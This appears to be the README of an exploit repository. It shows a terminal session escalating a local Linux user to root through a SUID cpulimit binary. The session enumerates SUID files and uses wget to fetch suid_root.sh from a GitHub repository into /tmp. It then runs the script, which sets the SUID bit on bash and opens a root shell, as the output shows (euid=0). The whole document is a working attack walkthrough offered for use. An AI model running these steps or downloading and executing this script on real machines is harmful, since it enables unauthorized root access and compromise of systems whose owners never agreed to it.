# CPULimit Linux Privilege Escalation

```bash
user@victim:~$ whoami && id && hostname
user
uid=1000(user) gid=1000(user) grupos=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
victim
user@victim:~$ find / -perm -4000 2>/dev/null | grep "cpulimit"
/usr/bin/cpulimit
user@victim:~$ cd /tmp/
user@victim:/tmp$ wget https://raw.githubusercontent.com/d4t4s3c/CPULimit-Linux-Privilege-Escalation/master/suid_root.sh
--2020-12-22 08:27:14--  https://raw.githubusercontent.com/d4t4s3c/CPULimit-Linux-Privilege-Escalation/master/suid_root.sh
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.132.133
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[151.101.132.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 635 [text/plain]
Grabando a: “suid_root.sh”

suid_root.sh                                   100%[=================================================================================================>]     635  --.-KB/s    en 0s      

2020-12-22 08:27:14 (3,33 MB/s) - “suid_root.sh” guardado [635/635]

user@victim:/tmp$ chmod +x suid_root.sh 
user@victim:/tmp$ ./suid_root.sh 

[i]  starting exploit.. 
[*]  check PATH bash: /usr/bin/bash
[*]  check PATH cpulimit: /usr/bin/cpulimit
[+]  granting SUID permissions to: /usr/bin/bash
Process 436 detected
Child process is finished, exiting...
[+]  getting a shell as root.. 
bash-5.0# whoami && id && hostname
root
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(user)
victim
bash-5.0# 
```
